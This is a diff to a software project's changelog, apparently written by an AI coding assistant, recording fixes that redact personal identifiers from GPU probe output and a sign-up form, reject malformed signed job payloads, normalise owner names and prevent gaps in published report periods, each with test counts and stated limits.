+1. **The project probe printed device IDs and home folders.** Step 2 on `/contribute` says to run `python3 -m app.gpu_probe_cli` and paste the output. It ran `vulkaninfo --summary` with the volunteer's whole environment and printed everything. In a real run here (Mesa's software Vulkan driver, plus a screen-capture layer installed in the home folder, which is common on gaming PCs) it printed both device UUIDs and `ERROR: ... /home/alice/obs-vkcapture/libVkLayer_obs.so`.
+2. **The form sent terminal prompts as typed.** In real Chromium, a paste with `alice@rig-01:~$` prompts, a `/home/alice/...` path and a `deviceUUID` was posted exactly like that. The page only asked people to remove names themselves.
+3. **The inventory tool missed one case.** `app.hw_inventory` already removed the host and user name, but only the exact login name, so a home folder named differently, or a run with `sudo` (login name `root`), would have kept it.
+
+**Shipped**
+- `gpu_probe_cli` now runs `vulkaninfo` the same safe way the inventory tool does (fixed command, no shell, a bare environment so home-folder add-ons aren't loaded) and replaces the host name, user names (including the person who ran `sudo`), home-folder names and UUIDs with `[host]`, `[user]` and `[uuid]`. Its output says so.
+- The inventory tool also replaces home-folder names (`/home/…`, `/Users/…`, `/var/home/…`, `C:\Users\…`).
+- The tester form checks the "Hardware check output" box as you type, after "Attach", when the page loads and on Send. It looks for `user@host` names (prompts and email addresses), home folders, Windows user folders, UUIDs and network card (MAC) addresses, plus the 12,000-character limit (text added by a button skips the browser's own limit). A spoken status line says what it found; a **Remove them** button swaps each one for a placeholder; Send is blocked until they're gone.
+- Step 2's wording now says the probe and the form do this.
+
+**Proof**
+- 15 new tests (`tests/test_gpu_probe.py`, `tests/test_contribute_form.py`); **all 15 fail on the old code**. The form tests run the page's own matching code under Node on real `vulkaninfo` and `lspci` text, check that ordinary output (the browser report, PCI addresses, version numbers) is left alone, and that cleaning twice changes nothing.
+- I broke the new code 14 ways on purpose; **all 14 were caught**.
+- Real Chromium at 390 and 1440 px: the old page posted the names; the new page blocked the first Send, cleaned with one click and posted only placeholders. The browser check's own report still sends first time. No sideways scroll at 390, 768 or 1440 px; strict HTML parse, site check and accessibility check pass.
+- **2,603 tests: 2,602 passing, 1 skipped** on the committed tree (the root-only test, as designed). New tests also pass on Python 3.11.
+
+**Honest limits:** the form can't spot a host name typed without a prompt, a real name written as plain text, or a serial number in a format it doesn't know. It's a helper, not a guarantee; you still read each sign-up. Nothing was sent to the real Netlify form.
+
+**What you learned**
+1. **A terminal prompt is a name tag.** `alice@rig-01:~$` is "user alice on the computer called rig-01". Copying a terminal window copies that too.
+2. **Error messages leak paths.** Programs complain about files by their full path, and a full path on Linux or Mac usually starts with `/home/<your name>`.
+3. **Run helper commands with a bare environment.** Starting `vulkaninfo` with only `PATH` set means it can't load add-ons from your home folder, so there's less to leak and less that can go wrong.
+4. **Write patterns that every browser can read.** One newer regular-expression feature ("look-behind") makes Safari before 16.4 reject the whole script, which would also break the device check on the same page, so the form avoids it (and a test keeps it that way).
+
+## 2026-11-28 (UTC): AI jobs no worker can run are refused before they're signed (0.5.78)
+
+**Why this, this hour.** PR #5 has green CI and no merge conflicts (GitHub's "blocked" means it's waiting for your review), and `main` has nothing the drafts branch is missing. Every GPU item left needs the rig or a decision from you, so this session did the twenty-sixth "code audit" pass, on the AI job format itself (`llm:generate`, Phase 2): can a job the coordinator accepted and signed still stop a worker? A worker trusts a signed job, so whatever the coordinator lets through reaches every rig.
+
+**Found (old tree, in-process coordinator and the worker's own `run_job` with a fake llama-cli)**
+1. **One job could stop rig after rig.** JSON lets you write a character as `\ud800`. That particular code is only half of a character pair; on its own Python reads it, but it can't be saved to a file. A prompt with one got `200` from `POST /v1/jobs` (and from `/v1/challenges`), was signed, and the worker crashed with `UnicodeEncodeError` while writing the prompt file. The lease runs out, the next rig takes the job and crashes too, until the job runs out of attempts.
+2. **Typos were ignored without a word.** `"max_token": 200` (missing `s`) ran with the default 64 tokens; `"temperature": 0.8`, a setting this task doesn't have, did nothing. The job looked like it asked for more than it did.
+3. **A key written twice was accepted.** `{"prompt": "a", "prompt": "b"}`: Python keeps the last copy, some other programs keep the first, so the job could mean two different questions depending on who reads it.
+4. **The check could crash itself.** A payload nested 4,000 brackets deep, or a 5,000-digit number, raised a Python error other than the task's own "refused" error. The coordinator happened to catch it, but the worker runs the same check first, so a job like that would have stopped it too.
+
+**Shipped**
+- An AI job may only have `model_id`, `prompt`, `max_tokens`, `seed` and `timeout_s`, each once, and the prompt must be valid text. Anything else is refused with `422` and a short reason (key names cut to 40 plain characters, so a hostile key can't fill the logs or the screen).
+- The check now only ever says "refused"; it never crashes. The AI runner also refuses an unwritable prompt itself, so a worker that gets such a job from an older coordinator prints "Could not run job ..." and keeps going.
+- `challenge_pool add` refuses a hidden test the coordinator would refuse (including a payload or expected answer that isn't valid text), because `issue` crosses a test off before sending it and it would be used up for nothing.
+
+**Proof**
+- 42 new tests (`tests/test_llm_payload.py`); **29 fail on the old code** (the other 13 check that good jobs still pass and run). They pass on Python 3.13 and 3.11 (what CI uses).
+- I broke the new code 12 ways on purpose; **all 12 were caught** (the first try missed one: a key name with accented letters slipped past the "plain characters" test, so I added that case).
+- **2,645 tests in total: 2,644 passing, 1 skipped** on the committed tree (the root-only test, as designed). One timing test (`test_guess_slots`) failed once while I was installing Python 3.11 packages at the same moment; it passed three times on its own and in the clean full run.
+
+**Honest limits:** jobs already queued with an extra key would now be refused by updated workers (there's no real ledger yet, so nothing is lost). Control characters and NUL in a prompt are still allowed on purpose (llama-cli reads the prompt from a file, and your screen views already clean them). Nothing ran on a GPU.
+
+**What you learned**
+1. **A signature says who sent it, not that it's safe.** The worker runs anything the coordinator signs, so the coordinator's checks are the rigs' only protection against a bad job, even an honest mistake.
+2. **"Valid JSON" isn't the same as "valid text".** JSON can describe half of a character pair; most files, databases and network messages can't hold one. Check text where it enters, not where it breaks.
+3. **Refuse what you don't recognise.** Ignoring unknown settings feels friendly, but it turns a typo into a job that quietly does something else. A clear "unknown key `max_token`" costs you ten seconds; a silent default costs a wrong result.
+4. **A checker must never crash.** If the code that decides "is this OK?" can throw a surprise error, that error becomes the new way in. Every failure should come out as a plain "no, because ...".
+
+## 2026-11-28 (UTC): One person typed two ways is one owner (0.5.79)
+
+**Why this, this hour.** PR #5 has green CI and no merge conflicts (GitHub's "blocked" means it's waiting for your review), and `main` has nothing the drafts branch is missing. Every GPU item left needs the rig or a decision from you, so this session did the twenty-seventh "code audit" pass, on the rule that keeps one person from checking their own work: **rigs with the same owner never re-check or break ties on each other's results.** That rule rests on the owner label you type each time you make an enrollment code.
+
+**Found (old tree, in-process coordinator)**
+1. **`Alice` and `alice` were two different people.** Codes made for each gave two rigs the coordinator treated as strangers. With re-checks on, the second rig was handed the hidden re-run of the first rig's AI answer (`200`), and its matching answer marked the result `confirmed`. The consistency check found nothing wrong.
+2. **`bob-smith`, `bob_smith` and `bob.smith` were three owners**, same problem.
+3. **A published ledger copy told outsiders the same story**: `Alice` and `alice` became `owner-1` and `owner-2`.
+4. **A new rig could pick a name that reads as an existing one**: `WK-A`, `wk_a` or `wka` next to `wk-a`, on your screens, the review queue and reports.
+5. Found while fixing 3: the copy swapped in labels with one database update per owner, so a real owner literally called `owner-1` was merged with whoever got the label `owner-1` first.
+
+**Shipped**
+- Owner labels are saved in lower case (the reply and the CLI show the saved label).
+- A new label that only differs from an existing one by `.`, `_` or `-` is refused with the existing name ("Use exactly that name if it's the same person, or a clearly different one"). It looks at registered rigs and codes not used yet, inside the same database step as saving the code.
+- Every owner comparison (who may re-check, who may take a job, the consistency check) ignores letter case, so a ledger written by older code is covered too, including a re-check older code had already handed to the wrong rig.
+- A worker id that matches an existing one once letter case and `. _ - :` are ignored is refused at registration (`409`); the enrollment code isn't used up, so the rig can retry with a clearly different name.
+- Ledger copies give one label per owner whatever the letter case, assigned rig by rig.
+
+**Proof**
+- 20 new tests (`tests/test_owner_names.py`); **18 fail on the old code** (the other 2 test the new helper itself).
+- I broke the new code 14 ways on purpose; **all 14 were caught** (the first try missed one: removing the case-insensitive check where a rig *takes* a job, because new re-checks are already aimed at an allowed rig. A test now covers a re-check that older code had already aimed at the wrong rig).
+- **2,665 tests in total: 2,664 passing, 1 skipped** on the committed tree (the root-only test, as designed).
+
+**Honest limits:** look-alike characters (`0`/`o`, `1`/`l`), spelling variants and one person under two real names still count as different owners; labels are still only as good as your hand-out. Your two-card plan (`owner-gpu0`, `owner-gpu1`) still gives two owners. Nothing ran on a GPU.
+
+**What you learned**
+1. **Computers compare letters, not meaning.** To a database `Alice` and `alice` are as different as `Alice` and `Zed`. If a rule depends on "the same person", decide what "the same" means and write it down in code.
+2. **Normalise when you save, compare loosely when you check.** Saving in lower case keeps new data tidy; comparing with `lower()` also covers data written before the rule existed, without rewriting anything.
+3. **Refuse the near-miss, don't guess.** If `bob_smith` arrives while `bob-smith` exists, the code can't know if it's the same Bob. Asking you (with the existing name in the message) is safer than silently merging or silently splitting.
+4. **A safety check in two places is worth testing in both.** Taking the case check out of one place broke no test at first, because the other place covered it. The second place is the one that protects data written by older code.
+
+## 2026-11-28 (UTC): No gaps between published report periods (0.5.80)
+
+**Why this, this hour.** PR #5 has green CI and no merge conflicts (GitHub's "blocked" means it's waiting for your review), and `main` has nothing the drafts branch is missing. Every GPU item left needs the rig or a decision from you, so this session did the twenty-eighth "code audit" pass, on the public logbook (`/reports/`): **does every result end up in exactly one published period?** The logbook already stopped two periods from *overlapping* (a result counted twice). Nobody had checked the opposite: a stretch of time that no period covers.
+
+**Found (old tree, in-process coordinator and `publish_report`)**
+1. **A period could start late and skip results.** Period 1 (`[0, T0+100)`) was posted. Then a signed report for `[T0+300, T0+400)` was posted too, even though one of wk-a's results was accepted at `T0+250`, inside the skipped stretch.
+2. **The first period could skip the start.** A first period beginning at `T0+50` was posted although 5 results were accepted at `T0`.
+3. **Nothing noticed.** Those points appeared in no published report, and `publish_report check` (the one CI runs) passed. So an operator, honest or not, could leave out an awkward stretch, for example one where a friend's rig failed a hidden test, and every public check would still say OK.
+
+**Shipped**
+- `publish_report add` now looks in the new ledger copy for accepted results between the end of the last posted period and the start of this one (or, for the first period, before its start). If there are any, it refuses and says where the period should start. An empty gap (a pause with no work) is allowed, since nobody loses anything.
+- `publish_report check` flags a gap already in the folder, so CI would catch one made by older code or a hand edit.
+- `reports/README.md` and `prototype/README.md` list the new rule.
+
+**Proof**
+- 6 new tests in `tests/test_publish_report.py`; **5 fail on the old code** for the reason they test (the sixth only because the switch it turns off doesn't exist there). One older test changed: posting period 2 before period 1 is now refused by the gap rule before it reaches the "can't go back in time" rule, so that rule got its own test.
+- I broke the new code 12 ways on purpose; **all 12 were caught** (the first try missed one: the hint for the first period named the latest skipped result instead of the earliest; a test now covers it). A boundary test checks that a period starting exactly on a result's second includes it.
+- **2,671 tests: 2,670 passing, 1 skipped** on the committed tree (the root-only test, as designed).
+
+**Honest limits:** this only covers *accepted results*. Rig activity counts (leases, timeouts) in an empty gap aren't points and aren't checked. It can't tell whether the ledger itself is complete; that's what `ledger_copy compare` between periods is for. Nothing has been published yet, so nothing already posted is affected. Nothing ran on a GPU.
+
+**What you learned**
+1. **"No overlaps" and "no gaps" are two different rules.** Stopping double counting doesn't stop leaving things out. A list of periods is only complete if each one starts where the last one ended (or the space between is provably empty).
+2. **A missing thing is the hardest to spot.** Every check here looked at what *was* published, and all of it was correct. The problem was what wasn't there, so the check has to go and look in the bigger copy for anything left out.
+3. **Allow the harmless case.** A gap with no results in it hurts nobody, so it's allowed; refusing it would just make you re-sign a report for no reason.
